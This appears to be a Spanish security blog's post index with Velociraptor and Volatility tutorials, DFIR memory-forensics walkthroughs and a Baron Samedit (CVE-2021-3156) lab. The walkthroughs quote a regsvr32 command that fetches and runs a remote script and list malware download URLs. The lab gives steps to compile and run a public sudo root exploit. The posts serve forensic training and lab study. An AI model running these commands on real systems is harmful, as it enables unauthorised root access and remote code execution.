[
  
  {
    "title": "Guía de Instalación y Configuración de Velociraptor en Ubuntu Server",
    "url": "/posts/velociraptor_guia/",
    "categories": "Defensivo, IDS",
    "tags": "ids, velociraptor, defensivo",
    "date": "2025-01-19 12:58:38 +0100",
    





    
    "snippet": "  Requisitos Previos          Un servidor Ubuntu Server (recomendado 20.04 LTS o superior)      Acceso de usuario con privilegios sudo      Conexión a internet      Pasos de InstalaciónActualizar e...",
    "content": "  Requisitos Previos          Un servidor Ubuntu Server (recomendado 20.04 LTS o superior)      Acceso de usuario con privilegios sudo      Conexión a internet      Pasos de InstalaciónActualizar el Sistemasudo apt updatesudo apt upgrade -yDescargar Velociraptor# Verificar la última versión en https://github.com/Velocidex/velociraptor/releaseswget https://github.com/Velocidex/velociraptor/releases/download/v0.73/velociraptor-v0.73.1-linux-amd64chmod +x velociraptor-v0.73.1-linux-amd64Configuración Inicial# Crear directorio de configuraciónsudo mkdir /opt/velociraptor# Generar configuración de servidorsudo ./velociraptor-v0.73.1-linux-amd64 config generate -i   Durante la configuración interactiva, te preguntará:          Tipo de despliegue (server, client, o standalone)      Dirección IP del servidor      Puertos a utilizar      Configuración de CA y certificados      Configurar IP de la interfazsudo nano /opt/velociraptor/server.config.yamlCrear instalador de serviciosudo ./velociraptor-v0.73.1-linux-amd64 --config /opt/velociraptor/server.config.yaml debian server --binary velociraptor-v0.73.1-linux-amd64sudo dpkg -i velociraptor_server_0.73.1_amd64.debIniciar y Habilitar el Servicio# Recargar systemdsudo systemctl daemon-reload# Iniciar serviciosudo systemctl start velociraptor# Habilitar inicio automáticosudo systemctl enable velociraptor# Verificar estadosudo systemctl status velociraptorAcceso WebEjemplo de Prueba: Monitoreo de un ClienteEn el Servidor: Generar Configuración de Clientewget https://github.com/Velocidex/velociraptor/releases/download/v0.73/velociraptor-v0.73.1-windows-amd64.exe# Generar paquete de instalación para cliente Linuxsudo ./velociraptor-v0.73.1-linux-amd64 config repack --exe velociraptor-v0.73.1-windows-amd64.exe /opt/velociraptor/client.config.yaml VelociraptorClient.exeEn el Cliente Windows:.\\VelociraptorClient.exe service install En la interfaz web:"
  },
  
  {
    "title": "Reto DFIR 3 - Atenea CCN",
    "url": "/posts/atenea_dfir_3/",
    "categories": "Labs & CTF, Walkthrough, DFIR",
    "tags": "dfir, forensics, malware analysis, memory analysis, volatility, cobalt strike",
    "date": "2025-01-17 18:16:41 +0100",
    





    
    "snippet": "RecursosVolcado de memoria utilizadoGoogle DriveAnálisis de procesos./vol2 -f Hell.img –profile=Win7SP1x64 pstreeHay una cadena de anidamiento sospechosa de cmd.exe -&gt; powershell.exe que se repi...",
    "content": "RecursosVolcado de memoria utilizadoGoogle DriveAnálisis de procesos./vol2 -f Hell.img –profile=Win7SP1x64 pstreeHay una cadena de anidamiento sospechosa de cmd.exe -&gt; powershell.exe que se repite varias veces:cmd.exe (2680) └─ powershell.exe (700)    └─ cmd.exe (1876)       └─ powershell.exe (2532)          └─ cmd.exe (2236)             └─ powershell.exe (2696)                └─ cmd.exe (2632)Procesos sospechosos relacionados con inyección:  inject.exe (PID 2648) con un proceso hijo inject.tmp (PID 2812)  La presencia de archivos .tmp es sospechosa en este contextoMSI_v1.0.3.exe (PID 880) lo tenemos en cuenta para el siguiente punto.Procesos con nombres sospechosos:  PZ.exe y PZshl.exe  NM34_x86.exe que inicia wscript.exe  diec.exeVarios procesos que podrían estar relacionados con la instalación de malware:  tsetup.exe con su archivo temporal tsetup.tmp  Múltiples instancias de notepad.exe que podrían estar siendo usadas para inyección de códigoAnálisis de conexiones./vol2 -f Hell.img –profile=Win7SP1x64 netscanMSI_v1.0.3.exe (PID 880) muestra un comportamiento inusual:  Tiene múltiples conexiones UDP en puerto 0  Realiza varios intentos de conexión al puerto 80 y 8080 de 10.0.0.200  Este patrón podría indicar actividad de malware o intentos de comunicación con un servidor de comando y controlHay dos conexiones TCP CLOSED con propietarios sospechosos:  PID 424 conectando a 152.18.134.4 (sin nombre de proceso)  PID 2 conectando a 56.43.118.4 con un nombre de proceso corrupto “??y????”Hay una conexión CLOSED desde el PID 197507 (identificado como “f?”) al puerto 8080, lo cual es sospechoso por:  El PID es inusualmente alto  El nombre del proceso está corrupto/incompleto  El puerto 8080 es comúnmente usado para proxies y servidores web alternativosHay un proceso con PID 88224 (identificado como “L?”) escuchando en el puerto UDP 60092Análisis de autorunsvol -f Hell.img windows.autorunHay dos instancias de mctadmin.exe configuradas para ejecutarse en RunOnce para diferentes perfiles de servicio (LocalService y NetworkService). Esto podría ser sospechoso porque:  Está configurado para ejecutarse una sola vez  Afecta a múltiples perfiles de servicio  No es un componente estándar de WindowsLa presencia de múltiples entradas de registro en diferentes hives (SOFTWARE, NTUSER.DAT) que ejecutan programas al inicio podría indicar persistencia de software potencialmente malicioso.Malfind./vol2 -f Hell.img --profile=Win7SP1x64 malfind -D ./malfind/ foremost *clamscan *Hemos exportado los procesos que el plugin malfind encuentra para posteriormente analizarlos con el antivirus ClamAV que es opensource y gratuito.Encontramos dos archivos .dll que parecen estar infectados con Cobalt Strike es una herramienta de post-explotación comercial comúnmente usada en ataques dirigidos.Si en vez de volcar los datos simplemente los listamos veremos que entre los procesos infectados se encuentra en efecto el proceso MSI_v1.0.3.exeSi lo extraemos y lo analizamos veremos el mismo tipo de infecciónEn las conexiones de red vimos que MSI_v1.0.3.exe intentaba conectarse a 10.0.0.200 en los puertos 80 y 8080Estos probablemente son los intentos de conexión al servidor de comando y controlAnálisis de conexiones en los procesos infectadosMediante malfind encontramos varios procesos infectados entre los que se encuentran varios svchosts.Tras identificar el PID de cada uno hemos llegado a la conclusión de que uno de ellos fue la infección inicial, ya que como veremos ahora realiza varias conexiones para descargar software malicioso../vol2 -f Hell.img –profile=Win7SP1x64 yarascan -Y “http” | grep -A 17 “Owner: Process svchost.exe”Encontramos en la memoria del proceso svchost.exe (PID 744) lo que parece ser el origen real de la infección:URLs de descarga del malware:  http://update.qyule.com/setup.exe  http://218.204.253.145/setup.exeHay referencias a “Zlob.ANA” en la memoria, lo que sugiere que podría haber una infección previa de un troyano ZlobEl malware parece mostrar un mensaje de alerta: “the computer has been infected!!”Hay una URL sospechosa adicional: “myfirstgaysex.com” que probablemente sea parte del vector de infección inicialEl User-Agent que se está usando es “mozilla/4.0 (compatible; msie 6.” lo que sugiere que está intentando parecer Internet Explorer 6Por lo tanto, parece que:      La máquina fue inicialmente infectada por una variante del troyano Zlob        Este troyano probablemente descargó el Cobalt Strike (MSI_v1.0.3.exe) como una infección secundaria        Aunque el Cobalt Strike está intentando conectarse a 10.0.0.200, la infección inicial vino de estos dominios maliciosos  Analisis de CMD./vol2 -f Hell.img –profile=Win7SP1x64 consolesSe confirma la existencia de un archivo “SHellb0t.zip” que fue descomprimido en el directorio temporal C:\\Users\\Baphomet\\AppData\\Local\\Temp\\Temp1_SHellb0t.zip\\diec.exeEl diec.exe que vimos anteriormente en el árbol de procesos (PID 2208) proviene de este archivo zip, lo que sugiere que:  No es el DIE-Engine legítimo, sino malware que se hace pasar por él  El nombre “SHellb0t” sugiere que es algún tipo de bot o backdoorVemos de nuevo la cadena de procesos cmd.exe/powershell.exe que identificamos antes, pero ahora con más detalles:cmd.exe (2680) └─ powershell.exe (700)    └─ cmd.exe (1876)       └─ powershell.exe (2532)          └─ cmd.exe (2236)             └─ powershell.exe (2696)                └─ cmd.exe (2632)Análisis con Yara rulesInsta11StringsSe encontraron múltiples coincidencias en las siguientes direcciones de memoria:    0xf8a003910961    0xf8a0039155b9    0xf8a00391a9e9    0xf8a003922631Cada coincidencia incluye un valor hexadecimal (ejemplo: 42 31 32 41 45...) que parece ser un identificador o un conjunto de datos codificados.PonmocupDirección de memoria: 0xfa8003ff3000Bytes coincidentes: 4d 5a 90 00 03 00 00 00 04 00 08 00...Regla relacionada: Coincide con Ponmocup, un malware conocido por actividades de robo de  información.ConclusiónTomando en cuenta todo lo analizado podemos intentar deducir que se trata de una infección por inyección de dll.Todo lo encontrado en los autoruns, lo exportado de los procesos infectados y la interacción con procesos a nivel de kernel indican que puede ser un rootkit de control remoto e incluso pertenecer a una antigua y conocida botnet.El hecho de encontrar múltiples DLLs infectadas sugiere que el malware está usando la técnica de “DLL injection”, que es una técnica común usada por Cobalt Strike para:  Mantener persistencia  Evadir detección  Ejecutar código malicioso en el contexto de otros procesos legítimosEsto encaja con el patrón completo que hemos visto:  La infección inicial probablemente vino por las URLs que encontramos en svchost.exe  El malware se propagó usando inyección de DLLs  MSI_v1.0.3.exe parece ser el payload principal de Cobalt Strike  La cadena de cmd/powershell probablemente fue usada para realizar la inyección de las DLLsPosiblemente parte de los procesos infectados hacen uso o provinen de otros procesos que hacen uso de estas dll."
  },
  
  {
    "title": "Reto DFIR 2 - Atenea CCN",
    "url": "/posts/atenea_dfir_2/",
    "categories": "Labs & CTF, Walkthrough, DFIR",
    "tags": "dfir, forensics, malware analysis, memory analysis, volatility",
    "date": "2025-01-15 19:12:49 +0100",
    





    
    "snippet": "RecursosEnlace del fichero usado (Google Drive)ContextoInformaciónSospechamos que el volcado de memoria adjunto se corresponde con una máquina que hasido infectada de forma persistente por algún ti...",
    "content": "RecursosEnlace del fichero usado (Google Drive)ContextoInformaciónSospechamos que el volcado de memoria adjunto se corresponde con una máquina que hasido infectada de forma persistente por algún tipo de malware, posiblemente un dropper.Nos gustaría identificar el dominio dañino utilizado por el mismo.Análisis de procesosAquí podemos ver algunos procesos interesantes y algunas anomalías que iremos viendo más adelanteIdentificando posibles inyecciones en los comandosEn volatility disponemos de un módulo para intentar detectar inyecciónes o comportamientos anómalos en los procesos de windows.Podemos ver que encuentra posibles anomalías en los dos prodesos de Internet Explorer y en csrssAnálisisEn el proceso csrss.exe (PID 592):-&gt; Tiene una región de memoria con permisos PAGE_EXECUTE_READWRITE (que es sospechoso para csrss.exe)-&gt; Contiene código ensamblador que parece shellcode, con instrucciones como OUT y STD que son inusuales en código legítimoEn dos procesos de IEXPLORE.EXE (PIDs 1624 y 3728):-&gt; Ambos tienen regiones idénticas en la dirección 0x5fff0000-&gt; También con permisos PAGE_EXECUTE_READWRITE-&gt; Contienen la firma “dtrR” seguida de un patrón de bytes similar-&gt; El código ensamblador incluye un CALL FAR que podría ser usado para ejecución de código maliciosoAnálisis de autorunsPlugin autorunGithubUna vez importado este plugin nos permite ver que ejecutables están configurados para ejecutarse al inicio del sistema lo que es normal en la forma de generar persistencia en un malware.![Análisis de autoruns](/assets/img/posts/atenea_dfir_2/20250115_193253_2025-01-15_20-32.pngAnálisisLa entrada más sospechosa esregsvr32 /u /s /i:http://wiki-read.com/info.txt scrobj.dllEste comando en el autoruns es muy sospechoso porque:-&gt; Usa regsvr32 para desregistrar (/u) scrobj.dll-&gt; Intenta cargar un script desde una URL externa (http://wiki-read.com/info.txt)-&gt; Se ejecuta silenciosamente (/s)-&gt; Está configurado para ejecutarse automáticamente al inicio del sistemaregsvr32 /s /n /i:U shell32Este comando aparece dos veces como “_nltide_2” en RunOnce para diferentes usuarios.Hasta ahora el posible vector inicial de infección parece ser la descarga y ejecución del script malicioso desde wiki-read.com mediante regsvr32, que es una técnica conocida de “Living off the Land” para evadir defensas.CorrelaciónEsto encaja con el hallazgo anterior:-&gt; El script malicioso probablemente fue descargado a través de Internet Explorer-&gt; Inyectó código en csrss.exe (un proceso crítico del sistema)-&gt; Los dos procesos de IE con la misma firma indican que el malware se replicóRelación con los procesosRelaciónLos procesos de Internet Explorer sospechosos (PIDs 1624 y 3728) son hijos de explorer.exe (PID 1868)-&gt; Esto es normal ya que IE se suele lanzar desde el explorador-&gt; Pero recordemos que ambos tienen la misma región de memoria maliciosaHay varios shells de cmd.exe abiertos (PIDs 3468, 300, 1080) también como hijos de explorer.exe-&gt; Esto podría indicar actividad de comando y control-&gt; Especialmente sospechoso tener múltiples shells abiertosHay dos instancias de explorer.exe (PIDs 1868 y 1608)-&gt; Una es hija de winlogon.exe (normal)-&gt; La otra (PID 1608) parece huérfana (su padre PID 1552 no existe)-&gt; Esta segunda instancia podría ser una persistencia del malwareEl proceso regedit.exe (PID 2664) podría indicar modificaciones al registro-&gt; Esto coincide con las entradas de autoruns que encontramos antesLínea temporalLa línea temporal sugiere:  23:47: Se inicia el primer IE sospechoso (PID 1624)  23:49: Se modifican las entradas de autoruns (según el output anterior)  23:52: Se inicia el segundo IE sospechoso (PID 3728)Análisis de conexiónesAnálisisLos procesos de IE sospechosos tienen actividad de red:-&gt; PID 1624 usando UDP puerto 1031 en 127.0.0.1-&gt; PID 3728 usando UDP puerto 1035 en 127.0.0.1-&gt; Ambos procesos usan conexiones UDP locales, lo que es inusual para IECronología interesante:-&gt; 23:47:13: Primera conexión del IE sospechoso (PID 1624)-&gt; 23:52:15: Segunda conexión del IE sospechoso (PID 3728)-&gt; Coincide con la timeline que vimos en el pstreeLa comunicación UDP en localhost entre los procesos de IE es especialmente sospechosa y podría indicar:  Comunicación entre componentes del malware  Túnel C2 (Command &amp; Control)  Evasión de firewallsAnálisis de URLs en memoriaDatos del proceso 1624Dado el timeline que hemos visto:-&gt; PID 1624 (primer IE) se inició a las 23:47:12-&gt; Las modificaciones del registro ocurrieron a las 23:49-&gt; PID 3728 (segundo IE) se inició después a las 23:52:15El PID 1624 parece ser la infección inicial que desencadenó todo, así que es el mejor candidato para buscar la URL maliciosa.Lo volcamos en un txt por si es mucho contenido"
  },
  
  {
    "title": "Reto DFIR 1 - Atenea CCN",
    "url": "/posts/atenea_dfir_1/",
    "categories": "Labs & CTF, Walkthrough, DFIR",
    "tags": "dfir, forensics, truecrypt, memory analysis, volatility",
    "date": "2025-01-15 10:19:16 +0100",
    





    
    "snippet": "RecursosDescarga del dump usado (Google Drive)ContextoLa policía ha detenido a un sujeto y tenemos como evidencia el ordenador encendido.Se le ha realizado una captura de RAM y análisis de la memor...",
    "content": "RecursosDescarga del dump usado (Google Drive)ContextoLa policía ha detenido a un sujeto y tenemos como evidencia el ordenador encendido.Se le ha realizado una captura de RAM y análisis de la memoria no volátil. En ella se haencontrado un extraño fichero que no saben de que puede ser.Tenemos un fichero llamado magic_file sin extension del cual no sabemos nada, solo que parece encriptado debido a la alta entropia de los datos contenidos.Analisis de procesosPrimero vamos a ver que procesos estaban abiertos en el momentoDe la lista de procesos en la memoria, algunos pueden llamar la atención:      MagnetRAMCapture.exe (PID 3120): Este es un software legítimo utilizado para capturar RAM, pero su presencia puede indicar que alguien realizó una captura de memoria en este sistema. Evalúa el motivo y quién pudo haberlo usado.        TrueCrypt.exe (PID 3612): TrueCrypt es una herramienta de cifrado. Su presencia puede sugerir que hay volúmenes cifrados en el sistema, tal vez relacionados con el archivo magic_file.        sppsvc.exe (PID 3076): Servicio relacionado con la protección de software de Windows. Aunque es legítimo, en ocasiones se aprovecha para esconder malware.        WmiPrvSE.exe (PIDs 404 y 2948): Normalmente son legítimos, pero múltiples instancias simultáneas pueden ser sospechosas.  Proceso TrueCryptYa que nuestro fichero parece encriptado es posible pensar que se hizo mediante este software.TrueCrypt fue un popular software de encriptación descontinuado a partir de 2015 y el proyecto Veracrypt tomó el relevo del mismo.Por suerte para este tipo de casos ya existe un plugin en volatility que nos puede ser de utilidad con TrueCryptExtrae la contraseña de encriptación cargada en el proceso de TrueCrypt si este se encontraba en ejecución al momento de la capturaIdentificación del fichero objetivoYa que tenemos la posible contraseña para descifrar el contenido del fichero ahora podemos probar a desencriptar los datos haciendo uso de dos variantes:      Usar veracrypt:    Es posible que alguna de las primeras versiones de veracrypt contase con un modulo de compatibilidad para TrueCrypt pero en las últimas versiones esto ha sido eliminado        Usar TrueCrypt:    Ya que sabemos que el proceso en ejecución se trataba de TrueCrypt podemos utilizar a última versión disponible antes de su descontinuación  Enlace de TrueCryptWeb OficialVamos a utilizar la versión Linux x64 cli.Para instalar damos permisos de ejecución al script de instalación y seleccionamos instalación completa o temporal.Desencriptado y acceso a los datosCreamos la ruta para montar el volumen y utilizamos la contraseña anteriormente extraida para visualizar el contenido."
  },
  
  {
    "title": "Volatility 2 & 3",
    "url": "/posts/volatility_avanzado/",
    "categories": "Forense, Herramientas",
    "tags": "forense, volatility, ram, memoria, windows",
    "date": "2025-01-14 12:58:38 +0100",
    





    
    "snippet": "ConceptoEn esta sección vamos a realizar un ejemplo de uso medio/avanzado de la herramienta Volatility 2 y 3.En el proceso vamos a ir obteniendo diferentes datos sobre el sistema a partir de un vol...",
    "content": "ConceptoEn esta sección vamos a realizar un ejemplo de uso medio/avanzado de la herramienta Volatility 2 y 3.En el proceso vamos a ir obteniendo diferentes datos sobre el sistema a partir de un volcado de memoria ram.InstalaciónVolatility 2Github oficial de volatility 2Volatility 3Github oficial de volatility 3pip install volatility3RecursosVolcado de memoria utilizadoEn el link anterior encontramos el volcado de memoria utilizado en esta sección.Perfil del sistema operativo-Vol3vol -f \"/path/to/file\" windows.info-Vol2vol.py -f \"/path/to/file\" imageinfovol.py -f \"/path/to/file\" kdbgscanVol3![Identifica el sistema como 7601.17514.amd64fre.win7sp1rtm.](/assets/img/posts/volatility_2_3/20250114_172936_2025-01-14_18-29.png)_Identifica el sistema como 7601.17514.amd64fre.win7sp1_rtm.Vol2Aqui de igual forma indica windows 7 sp1Procesos en ejecución-Vol3vol.py -f \"/path/to/file\" windows.pslistvol.py -f \"/path/to/file\" windows.psscanvol.py -f \"/path/to/file\" windows.pstree-Vol2vol.py -f \"/path/to/file\" ‑‑profile &lt;profile&gt; pslistvol.py -f \"/path/to/file\" ‑‑profile &lt;profile&gt; psscanvol.py -f \"/path/to/file\" ‑‑profile &lt;profile&gt; pstreevol.py -f \"/path/to/file\" ‑‑profile &lt;profile&gt; psxviewVol3Vol2Total de 42 procesosÁrbol de procesos-Vol3vol.py -f \"/path/to/file\" windows.pstree-Vol2vol.py -f \"/path/to/file\" ‑‑profile &lt;profile&gt; pstreeVol3(Como vemos no parsea demasiado bien el contenido)Vol2Por ejemplo podemos ver con más claridad el PPID de cada uno de los procesos.Registro de WindowsLista de hives-Vol3vol.py -f \"/path/to/file\" windows.registry.hivescanvol.py -f \"/path/to/file\" windows.registry.hivelist-Vol2vol.py -f \"/path/to/file\" ‑‑profile &lt;profile&gt; hivescanvol.py -f \"/path/to/file\" ‑‑profile &lt;profile&gt; hivelistVol3Vol2En ambos coincide que existen 12 hives en el registroClaves de registro-Vol3vol.py -f \"/path/to/file\" windows.registry.printkeyvol.py -f \"/path/to/file\" windows.registry.printkey ‑‑key \"Software\\Microsoft\\Windows\\CurrentVersion\"-Vol2vol.py -f \"/path/to/file\" ‑‑profile &lt;profile&gt; printkeyvol.py -f \"/path/to/file\" ‑‑profile &lt;profile&gt; printkey -K \"Software\\Microsoft\\Windows\\CurrentVersion\"Vol3Por ejemplo vemos que en SYSTEM existen 9 claves incluyendo las volátilesVol2Claves especificas-Vol3vol.py -f \"/path/to/file\" windows.registry.printkey ‑‑key\"Software\\Microsoft\\Windows\\CurrentVersion\"- Vol2vol.py -f \"/path/to/file\" ‑‑profile &lt;profile&gt; printkey -K \"Software\\Microsoft\\Windows\\CurrentVersion\"Vol3Vol2Hash de contraseñas-Vol3vol.py -f &lt;ruta_a_la_imagen&gt; windows.hashdump- Vol2vol.py -f \"/path/to/file\" ‑‑profile &lt;profile&gt; hashdumpVol3Vol2En este caso la contraseña es sencillaConexiones externas-Vol3vol.py -f &lt;ruta_a_la_imagen&gt; windows.netstat- Vol2vol.py  -f &lt;ruta_a_la_imagen&gt; --profile=&lt;perfil_de_sistema&gt; netscanVol3Vol2En este caso volatility 2 es más capazEstructuras FILE_OBJECT-Vol3vol.py -f &lt;ruta_a_la_imagen&gt; windows.filescan- Vol2vol.py  -f &lt;ruta_a_la_imagen&gt; --profile=&lt;perfil_de_sistema&gt; filescanVol3Extrae 3420 resultadosVol2Extrae 3423 resultadosExtracción de ficheros-Vol3vol.py -f [ImageName] -o \"dump\" windows.dumpfile --pid 1328 --virtaddr 0xbf0f6abe9740- Vol2vol.py -f \"/path/to/file\" ‑‑profile &lt;profile&gt; dumpfiles ‑‑dump-dir=\"/path/to/dir\" -p &lt;PID&gt;Localizar un ficheroLocalizamos el procesoVol3Vol2Rutas de ficheros-Vol3vol.py -f \"/path/to/file\" windows.filescan- Vol2vol.py -f \"/path/to/file\" ‑‑profile &lt;profile&gt; filescanVol3Vol2Tabla MFT-Vol3vol.py -f &lt;ruta_a_la_imagen&gt; windows.mftscan.MFTScan- Vol2vol.py -f &lt;ruta_a_la_imagen&gt; --profile=&lt;perfil_de_sistema&gt; mftparserVol3Vol2Aqui podemos ver las fechas de acceso, modificacion, etc de los archivos de los que tengamos interésURLs en memoria-Vol3vol.py -f \"/path/to/file\" windows.vadyarascan --yara-rules \"https://\" | grep -A 5 -B 5 \"Process firefox\"- Vol2vol.py -f &lt;imagen_memoria&gt; --profile=&lt;perfil&gt; yarascan -Y \"https://\" | grep -A 5 -B 5 \"Process firefox\"Vol2Podemos ver diferentes URL almacenadas en la memoriaFechas de ejecución-Vol3vol.py -f &lt;imagen_memoria&gt; windows.registry.printkey --key \"Software\\\\Mozilla\\\\Firefox\"- Vol2vol.py -f &lt;imagen_memoria&gt; --profile=&lt;perfil&gt; printkey -K \"Software\\\\Mozilla\\\\Firefox\"Vol3Vol2Mas o menos podemos deducir las ultimas fechas en función de las ultimas modificaciones de las llaves en el registro de windowsFechas de navegación a URLsSi necesitamos visualizar la fecha y hora en la que se visualizó una URL podemos acceder a la base de datos sqlite que genera el navegador.En este caso firefox genera varias bases de datos en las que almacena cookies, bookmarks, historiales, etc por lo que deberían estar en memoria ya que el proceso está en ejecución.Localizamos el proceso principal del navegadorVolcamos toda los datos del proceso. En este caso se ha usado volatility 2 pero es indiferentePodemos verificar que en el volcado podemos encontrar estas bases de datos gestionadas por el navegadorAhora que sabemos que los documentos están en uso por el proceso vamos a volcar toda los datos en memoria cargados pero de forma individualEsto nos va a generar muchos archivos que tendremos que filtrar ahoraPor ejemplo podemos filtrar los archivos por tipo ya que el nombre que le asigna volatility es la dirección de memoria que ocupa y el proceso del que viene.En este caso simplemente con un explorador de archivos organizamos por tipo de fichero y nos quedamos los sqlite.Vamos a tener que comprobar el contenido a mano de cada uno pero lo más normal es que el fichero sqlite más grande sea el que contiene el historial, bookmarks y otros datos.Le podemos cambiar el nombre para que sea más fácil de referenciarAhora que tenemos el documento podemos abrir la base de datos con sqlite y acceder a los datosEn este caso podemos la URL que vimos anteriormente mediante YARALa fecha de visita es el número en la tercera columna pero no es visible. Esto es por cómo son almacenadas las fechas en sqlite pero es un cálculo sencillo.2020-06-12 14:18:23BonusContextoEn esta sección bonus vamos a realizar un analisis más profundo sobre un proceso en concreto.El objetivo es sencillo; anteriormente conseguimos encontrar un fichero 7z en memoria, el problema es que viene conmprimido con contraseña por lo que tenenmos dos opciones.1- Intentar crackear el fichero2- Buscar en el dump de memoria si la contraseña puede estar en algún proceso abiertoPodemos proceder de la siguiente forma:Mientras dejamos algun software de crackeo intentar descifrar el archivo vamos a indagar en el dump.En este apartado vamos a estar utilizando únicamente volatility 3.Listar procesosvol.py -f &lt;imagen_memoria&gt; windows.pslistVemos los dos procesos que nos pueden interesar, de uno ya tenemos el 7z y ahora podemos ver que hay contenido en el proceso del notepadPara este proceso existen numerosos comandos que nos pueden dar más información sobre el contenido en memoria del proceso notepad.exevol -f dump.raw windows.memmap --pid &lt;PID_notepad&gt; --dumpvol -f dump.raw windows.vadinfo --pid &lt;PID_notepad&gt;Estos comandos nos proporcionarán bastante información e incluso es posible que el contenido del fichero que estuviese editando el usuario en el momento de la captura pero analizar el dump puede ser tedioso y alargarse demasiado, es por eso que existen plugins ya hechos por la comunidad para ciertas tareas y es lo que vamos a estar utilizando aquí.Enlace al pluginGithubEste plugin lo debemos mover a la ruta donde tengamos localizado nuestro volatility.En este caso como lo instalamos mediante pip y en linux la ruta debería ser:/home/kali/.local/lib/python3.12/site-packages/volatility3/framework/plugins/windows/Ahora si podemos ejecutar el plugin de la siguiente formavol.py -f dump.raw windows.notepadAunque el contenido es algo lioso quizás la mejor manera de proceder es identificar la zona que el usuario podría estar viendo en pantalla, es decir la interfaz de usuario.Cuando identifiquemos el posible texto que necesitamos podemos proceder a intentar descifrar el fichero obtenido anteriormente.En este caso vamos 4 ficheros porque anteriormente realizamos la extración con volatility 2 y 3"
  },
  
  {
    "title": "Baron Samedit - Escalación de privilegios en Linux",
    "url": "/posts/baron_samedit/",
    "categories": "Labs & CTF, Privilege Escalation",
    "tags": "linux, privilege escalation, sudo, vulnerability, cve-2021-3156",
    "date": "2025-01-11 13:01:50 +0100",
    





    
    "snippet": "En enero de 2021, Qualys publicó un artículo en su blog explicando una nueva vulnerabilidad crítica en el programa sudo de Unix.Esta vulnerabilidad era un desbordamiento de memoria en el montón (he...",
    "content": "En enero de 2021, Qualys publicó un artículo en su blog explicando una nueva vulnerabilidad crítica en el programa sudo de Unix.Esta vulnerabilidad era un desbordamiento de memoria en el montón (heap buffer overflow) que permitía a cualquier usuario obtener privilegios de administrador (root), sin que fuera necesario que el sistema tuviera configuraciones incorrectas. Lo preocupante de este fallo es que funciona con la configuración predeterminada y afecta a cualquier usuario, sin importar los permisos que tenga configurados en sudo. Aunque la vulnerabilidad ya fue corregida, afecta a las versiones no actualizadas del programa sudo entre la 1.8.2 y la 1.8.31p2, y entre la 1.9.0 y la 1.9.5p1, lo que significa que este fallo estuvo presente durante una década.El problema se solucionó rápidamente, y las versiones parcheadas se distribuyeron pronto en los repositorios oficiales, por lo que los sistemas actualizados ya no son vulnerables. Sin embargo, en sistemas que aún no han sido actualizados, esta vulnerabilidad sigue siendo muy peligrosa.Esta vulnerabilidad, al igual que la CVE-2019-18634, está relacionada con un desbordamiento de memoria en el programa sudo. Sin embargo, en este caso, se trata de un desbordamiento en el montón (heap), no en la pila (stack), como en el caso anterior. La pila es una parte de la memoria que organiza y gestiona datos clave del programa de manera estricta, mientras que el montón es un espacio de memoria más flexible, usado para la asignación dinámica. Aunque no profundizaremos en los detalles técnicos para mantener el contenido accesible, lo importante es entender que esta vulnerabilidad es extremadamente potente y afecta a un gran número de sistemas.ComprobaciónPrimero comprobamos si el sistema es vulnerable:sudoedit -s '\\' $(python3 -c 'print(\"A\"*1000)')Si el sistema es vulnearble obtenemos un error por corrupción de memoriaEste PoC fue descubierto por lockedbyte:GithubExplotaciónCuando Qualys anunció esta vulnerabilidad, no proporcionó el código completo para explotarla. Sin embargo, otros investigadores pronto lograron recrear el fallo. El primer exploit completamente funcional que se publicó fue desarrollado por un investigador apodado bl4sty, y su código está disponible en Github. En esta práctica, utilizaremos ese exploit para aprovechar la vulnerabilidad.GithubCon el repositorio clonado debemos compilar el PoC:makels -la./sudo-hax-me-a-sandwichComo tenemos que seleccionar la versión del sistema podemos verificar cual es de la siguiente forma:cat /etc/issueAhora que sabemos la verión concreta ejecutamos el exploit:./sudo-hax-me-a-sandwich 0ExplicaciónExplicación del Heap Buffer OverflowUn heap buffer overflow ocurre cuando un programa escribe más datos en un búfer (un área de memoria) de lo que este puede manejar. El heap es una región de la memoria utilizada para la asignación dinámica de memoria, es decir, cuando el programa necesita reservar memoria de manera flexible durante su ejecución.El funcionamiento de la vulnerabilidadEl error se origina en la forma en que sudo maneja ciertos argumentos de la línea de comandos cuando se utiliza para ejecutar otros programas. sudo tiene una función interna que procesa estos argumentos, y allí es donde ocurre el desbordamiento.Normalmente, cuando usas sudo, este se encarga de verificar que el usuario tenga los permisos necesarios para ejecutar el comando. Si todo está bien, se ejecuta el comando con privilegios elevados.El fallo está relacionado con cómo sudo maneja la memoria para los argumentos de un comando en ejecución. Debido a un desbordamiento de búfer en el heap, se puede sobrescribir un área crítica de memoria, lo que permite a un atacante modificar el flujo de control del programa. En otras palabras, el atacante puede inyectar código arbitrario en la memoria del programa y cambiar su comportamiento.Cómo se explotaPara explotar esta vulnerabilidad, un atacante envia una entrada maliciosa a sudo que cause el desbordamiento de búfer en el heap. Este desbordamiento podría corromper datos clave en la memoria del programa, como la dirección de retorno de una función o las variables de control, permitiendo al atacante ejecutar código arbitrario.En este caso, el atacante no necesita estar en un grupo con privilegios de sudo, porque el fallo no depende de la configuración de sudoers (el archivo que determina quién puede usar sudo), sino de un defecto en el manejo de la memoria de sudo.Estructura de control del flujo (return address)Uno de los objetivos principales de un desbordamiento de búfer es sobrescribir la dirección de retorno de una función.Esta dirección se almacena en la pila, y cuando una función termina de ejecutarse, el programa regresa a la dirección que está en la variable de retorno para continuar la ejecución.Al sobrescribir la dirección de retorno, se puede hacer que el programa salte a una dirección de memoria arbitraria, en lugar de regresar de manera normal a la función que lo llamó.Permite que el atacante redirija la ejecución del programa a código malicioso.Variables de control de seguridad (como los punteros a funciones)Las funciones dentro de sudo realizan varias verificaciones de seguridad para asegurarse de que el usuario tiene los permisos adecuados. Un atacante puede intentar sobrescribir variables relacionadas con el control de acceso, como los punteros a las funciones que realizan estas verificaciones.Si se sobrescriben estos punteros, podría hacer que el programa llame a funciones maliciosas en lugar de las funciones de verificación de permisos, permitiendo la escalada de privilegios.Permiten al atacante evitar las verificaciones de permisos y ejecutar comandos con privilegios elevados.Memoria relacionada con la configuración de sudoersPotencialmente permite que el atacante manipule configuraciones para ejecutar comandos sin permisos.Buffers de argumentos de comandoPermiten la inyección de comandos maliciosos para ejecutar como root.Punteros a la memoria en el heapPermiten redirigir la ejecución hacia código controlado por el atacante.Esto es un resumen del concepto explicado lo más simple posible para entender el funcionamiento del mismo."
  },
  
  {
    "title": "Recopilación y análisis de datos en caliente Windows",
    "url": "/posts/DFIR_Script_volatility/",
    "categories": "Forense, Windows",
    "tags": "forense, windows, memoria, volatility, ram, dfir",
    "date": "2025-01-08 12:58:38 +0100",
    





    
